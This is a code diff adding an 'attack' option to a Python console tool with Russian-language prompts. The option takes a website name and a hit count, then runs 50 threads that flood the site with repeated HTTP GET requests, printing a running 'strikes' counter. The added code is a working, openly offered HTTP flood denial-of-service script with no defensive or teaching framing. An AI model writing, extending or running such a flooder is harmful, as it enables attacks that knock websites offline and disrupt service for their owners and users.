@@ -1,7 +1,10 @@
+import threading
 import os
+import requests as req
+
+hits = 0
 
 os.system("clear")
-
 
 #Table of colors
 D = "\033[1;30m" # DARK
@@ -46,3 +49,29 @@ while True:
     select = input(f"{V}Zkid>> {RE}")
     if select == "0":
         exit()
+    elif select == "1":
+        import threading
+        urlname = input(f"{Y}Назв сайта: {RE}https://")
+        url = "https://" + urlname
+        total = int(input(f"{Y}Количество ударов: {RE}"))
+        threads_num = 50
+        hits = 0
+        lock = threading.Lock()
+        def attack():
+            global hits
+            while hits < total:
+                try:
+                    req.get(url, timeout=2)
+                    with lock:
+                        if hits < total:
+                            hits += 1
+                            print(f"\r{G}Ударов: {hits}/{total}{RE}", end="", flush=True)
+                except: pass
+        print(f"{R}Атака...{RE}")
+        threads = []
+        for i in range(threads_num):
+            t = threading.Thread(target=attack)
+            t.start()
+            threads.append(t)
+        for t in threads: t.join()
+        print(f"\n{C}Готово{RE}")
